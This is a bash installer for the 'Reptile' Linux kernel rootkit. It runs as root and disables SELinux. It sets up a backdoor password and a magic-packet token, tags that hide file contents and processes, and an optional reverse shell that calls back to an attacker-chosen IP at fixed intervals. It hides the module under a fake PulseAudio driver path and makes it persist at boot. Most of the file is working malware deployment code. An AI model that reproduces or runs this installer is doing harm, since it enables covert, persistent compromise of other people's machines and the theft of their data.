#!/bin/bash
#
# Reptile Install Script
# Author: F0rb1dd3n

DRIVER="PulseAudio"
KERNEL_VERSION=$(uname -r)
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function banner {
	echo -e "\n\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
	echo -e "\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;36mwritten by: F0rb1dd3n\e[00m\n"
}

function usage {
	banner
	echo -e "Usage: $0 <arg>\n"
	echo -e "\tinstall\t\tCompile and install the module persistently"
	echo -e "\tremove\t\tRemove the persistence of module"
	echo -e "\tclient\t\tConfigure and compile remote client"
	echo -e "\treverse\t\tBuild a standalone version of reptile shell\n"
}

function load_config {
	RETVAL=""

	if [ -z $2 ]; then
		ROTULE="$1: "
	else
		ROTULE="$1 (default: $2): "
	fi

	read -p "$ROTULE"
	if [ -z $REPLY ]; then
		RETVAL=$2
	else
		RETVAL=$REPLY
	fi
}

function directory_remove {
	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
        echo -n "Removing $PWD... "
        rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
        echo -e "Not removing $PWD"
	else
        echo -e "Invalid option. Not removing $PWD"
	fi
}

function reptile_init {
	banner

	[ $(uname) != "Linux" ] && {
		echo "Not on a Linux system. Exiting..."
		exit
	}

	[ $(id -u) != 0 ] && {
		echo "Not root. Exiting..."
		exit
	}

	if [ -f /etc/selinux/config ]; then
        	echo -ne "SELinux config found on system!\nChecking SELinux status... "
        	if [[ $(cat /etc/selinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
                	echo -ne "\e[01;31menforcing\e[00m\n"
                	echo -n "Trying to set enforce permissive... "
                	setenforce 0
                	if [ "$(getenforce)" == "Permissive" ]; then
                    	echo -e "\e[01;36mDONE!\e[00m"
                	else
                    	echo -e "\e[01;31mERROR!\e[00m"
                	fi
                	echo -n "Trying to disable SELinux... "
                	sed -i "s:SELINUX=enforcing:SELINUX=disabled:" /etc/selinux/config || {
                        echo -e "\e[01;31mERROR!\e[00m\n"
                        #exit
                	}
                	echo -e "\e[01;36mDONE!\e[00m"
                	echo -e "\e[01;33mMaybe you will need to reboot!\e[00m\n"
        	else
                	echo -e "\e[01;36mclear\e[00m\n"
        	fi
	fi      

	[ ! -e /proc ] && {
        echo -e "We're in a horrible jail as /proc doesn't exist. Exiting...\n"
        exit
	}

    for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
    do 
    	SYSTEM=${f:5:${#f}-13}
    done

    if [ "$SYSTEM" == "" ]; then
    	exit
    fi

	#perl -MCPAN -e "install String::Unescape"# > /dev/null 2>&1
}

function config_gen {
	load_config "Hide name (will be used to hide dirs/files)" "reptile"
	MODULE=$RETVAL
	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"

	load_config "Auth token to magic packets" "hax0r"
	TOKEN=$RETVAL

	load_config "Backdoor password" "s3cr3t"
	PASS=$RETVAL

	load_config "Tag name that hide file contents" "reptile"
	TAG=$RETVAL

	load_config "Source port of magic packets" "666"
	SRCPORT=$RETVAL

	load_config "Would you like to config reverse shell each X time? (y/n)" "n"
	RSH=$RETVAL

	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
		load_config "Reverse IP"
		LHOST=$RETVAL
		
		load_config "Reverse Port" "80"
		LPORT=$RETVAL

		load_config "How long is your interval? (in seconds)" "1800"
		INTERVAL=$RETVAL
	fi

	echo -e "\nToken: \e[01;36m$TOKEN\e[00m"
	echo -e "Backdoor password: \e[01;36m$PASS\e[00m"
	echo -e "SRC port: \e[01;36m$SRCPORT\e[00m"

	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
		echo -e "\nReverse shell each X time:"
		echo -e "Reverse IP: \e[01;36m$LHOST\e[00m"
		echo -e "Reverse Port: \e[01;36m$LPORT\e[00m"
		echo -e "Interval: \e[01;36m$INTERVAL\e[00m"
	fi

	echo -e "\nTAGs to hide file contents: \n\n\e[01;36m#<$TAG>\n\e[00mcontent to be hidden\n\e[01;36m#</$TAG>\e[00m\n"

	echo -ne "Configuring... "
	
	if [ ! -d $DRIVER_DIRECTORY ]; then
        mkdir -p $DRIVER_DIRECTORY
    fi

	_SHELL="/"$MODULE"/"$MODULE"_reverse"
	__SHELL="./"$MODULE"_reverse"
	CMD="/"$MODULE"/"$MODULE"_cmd"
	
	cat > scripts/start <<EOF
#!/bin/bash
#<$TAG>
EOF

	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
		cat >> scripts/start <<EOF	
$_SHELL -t $LHOST -p $LPORT -s $PASS -r $INTERVAL
EOF
	fi

	cat >> scripts/start <<EOF
$CMD hide \`ps -ef | grep "ata/0" | grep -v grep | awk '{print \$2}'\`
$CMD file-tampering
#</$TAG>
EOF
	chmod +x scripts/start
	
	START="/"$MODULE"/"$MODULE"_start"
	TAGIN="#<$TAG>"
	TAGOUT="#</$TAG>"

	cat > config.script <<EOF
#ifndef _CONFIG_H
#define _CONFIG_H

#define TOKEN 		"$TOKEN"
#define PASS 		"$PASS"
#define SHELL 		"$_SHELL"
#define START 		"$START"
#define HIDE 		"$MODULE"
#define HIDETAGIN 	"$TAGIN"
#define HIDETAGOUT 	"$TAGOUT"
#define PATH        "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
#define WORKQUEUE	"ata/0"
#define SRCPORT 	$SRCPORT

#endif
EOF

	cat config.script | perl scripts/destringify.pl > config.h
	#cat config.script > config.h
	rm -rf config.script

	HOMEDIR="/root"
	RCFILE="/"$MODULE"/"$MODULE"_rc"

	cat > sbin/config.script <<EOF
#ifndef _CONFIG_H
#define _CONFIG_H

#define HOMEDIR		"$HOMEDIR"
#define RCFILE 		"$RCFILE"
#define GET_FILE 	1
#define PUT_FILE 	2
#define RUNSHELL 	3
#define SET_DELAY 	4
#define OUT 		5
#define EXIT_LEN 	16
#define EXIT 		";7(Zu9YTsA7qQ#vw"

#endif
EOF

	cat sbin/config.script | perl scripts/destringify.pl > sbin/config.h
	#cat sbin/config.script > sbin/config.h
	rm -rf sbin/config.script

	echo -e "\e[01;36mDONE!\e[00m"
}

function reptile_install {
	reptile_init
	config_gen

	echo -ne "Compiling... "
	make all > /dev/null 2>&1 && \
	make clean > /dev/null 2>&1 && \
	mv bin/reptile bin/$MODULE.ko > /dev/null 2>&1 && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	echo -ne "Copying files to \e[01;32m/$MODULE\e[00m... "
	mkdir -p /$MODULE 2> /dev/null && \
	cp bin/$MODULE* /$MODULE 2> /dev/null && \
	cp bin/reverse /$MODULE/$MODULE"_reverse" 2> /dev/null && \
	cp bin/cmd /$MODULE/$MODULE"_cmd" 2> /dev/null && \
	cp scripts/start /$MODULE/$MODULE"_start" 2> /dev/null && \
	cp scripts/bashrc /$MODULE/$MODULE"_rc" 2> /dev/null && \
	chmod 777 /$MODULE/* && \
	rm -rf bin 2> /dev/null && \
	rm -f scripts/start 2> /dev/null && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	echo -ne "Installing... "

	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

    if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
    	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
    	echo -ne "#<$TAG>\nmodprobe $MODULE\n#</$TAG>" >> /etc/rc.modules && \
		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	#elif [ "$SYSTEM" == "arch" ]; then
    #	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    fi

	depmod && insmod /$MODULE/$MODULE.ko > /dev/null 2>&1
	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	directory_remove
	echo -e "\nInstalation has finished!\n"
}

function reptile_remove {
	banner

	load_config "Hide name" "reptile"
	MODULE=$RETVAL
	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
	
	if [ ! -d "/$MODULE" ]; then
	    echo -e "Reptile seems to be uninstalled!\n"	
	    exit
	fi

	echo -e "\n\e[01;31mPussy!\e[00m"
	echo -ne "Uninstalling... "

	rm -rf /etc/rc.modules
	rm -rf /etc/modules
	depmod

	if [ -z $(lsmod | grep reptile | cut -d " " -f 1) ]; then
		/$MODULE/$MODULE"_cmd" show > /dev/null 2>&1 || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	fi

	rm -rf /$MODULE && \
	rm -rf $DRIVER_DIRECTORY && \
	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	directory_remove
	echo

	read -p "To complete this uninstallation is needed to reboot (Y/N) [default: N]: "
	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
        echo -e "Rebooting... "
        reboot
	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
        echo -e "Not rebooting the system!"
	else
        echo -e "Invalid option. Not rebooting the system!"
	fi
	echo
}

function client_build {
	banner

	echo -ne "\nConfiguring... "

	cat > sbin/config.script <<EOF
#ifndef _CONFIG_H
#define _CONFIG_H

#define GET_FILE 	1
#define PUT_FILE 	2
#define RUNSHELL 	3
#define SET_DELAY 	4
#define OUT 		5
#define EXIT_LEN 	16
#define EXIT 		";7(Zu9YTsA7qQ#vw"

#endif
EOF

	#cat sbin/config.script | perl scripts/destringify.pl > sbin/config.h
	cat sbin/config.script > sbin/config.h
	rm -rf sbin/config.script
	echo -e "\e[01;36mDONE!\e[00m"

	echo -ne "Compiling... "
	mkdir -p bin && \
	cd sbin && \
	make listener > /dev/null 2>&1 && \
	make packet > /dev/null 2>&1 && \
	make client > /dev/null 2>&1 && \
	make clean > /dev/null 2>&1 && \
	cd .. && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	echo -e "\nYour client is at \e[01;32mbin/\e[00m\n"
}

function reverse_build {
	banner

	echo -ne "\nConfiguring... "

	cat > sbin/config.script <<EOF
#ifndef _CONFIG_H
#define _CONFIG_H

#define HOMEDIR		"/root"
#define RCFILE 		"/var/tmp/.bashrc"
#define GET_FILE 	1
#define PUT_FILE 	2
#define RUNSHELL 	3
#define SET_DELAY 	4
#define OUT 		5
#define EXIT_LEN 	16
#define EXIT 		";7(Zu9YTsA7qQ#vw"

#endif
EOF

	cat sbin/config.script | perl scripts/destringify.pl > sbin/config.h
	#cat sbin/config.script > sbin/config.h
	rm -rf sbin/config.script
	echo -e "\e[01;36mDONE!\e[00m"

	echo -ne "Compiling... "
	mkdir -p bin && \
	cd sbin && \
	make standalone_reverse > /dev/null 2>&1 && \
	make clean > /dev/null 2>&1 && \
	cd .. && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	echo -e "\nYour reverse shell is at \e[01;32mbin/\e[00m\n"
}

case $1 in
    install)
    	reptile_install
    	;;
    remove)
    	reptile_remove
    	;;
	client)
		client_build
		;;
	reverse)
		reverse_build
		;;
	"")
		usage
		;;
esac
